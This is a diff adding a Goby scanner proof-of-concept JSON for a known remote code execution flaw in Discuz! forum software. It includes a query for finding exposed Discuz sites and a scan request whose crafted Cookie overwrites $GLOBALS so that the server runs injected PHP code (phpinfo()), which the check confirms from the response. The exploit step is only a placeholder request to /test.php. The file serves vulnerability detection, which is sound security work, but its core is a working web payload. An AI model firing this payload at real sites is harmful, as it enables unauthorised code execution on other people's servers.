@@ -1,0 +1,108 @@
+{
+      "Name": "Discuz RCE WOOYUN-2010-080723",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "app=\"Discuz\" || body=\"Powered by Discuz!\"",
+      "Description": "Discuz! is Internet forum software written in PHP and developed by Comsenz Technology Co., Ltd. It supports MySQL and PostgreSQL databases.",
+      "Product": "Discuz!",
+      "Homepage": "https://www.discuz.net/",
+      "Author": "",
+      "Impact": "Since the default value of request_order in the php.ini setting in php5.3.x version is GP, $_COOKIE is no longer included in $_REQUEST. We overwrite the global variable by passing in $GLOBALS in the cookie, resulting in a code execution vulnerability.",
+      "Recommendation": "",
+      "References": [
+            "https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/viewthread.php?tid=10",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=phpinfo();"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "PHP Version",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "System",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
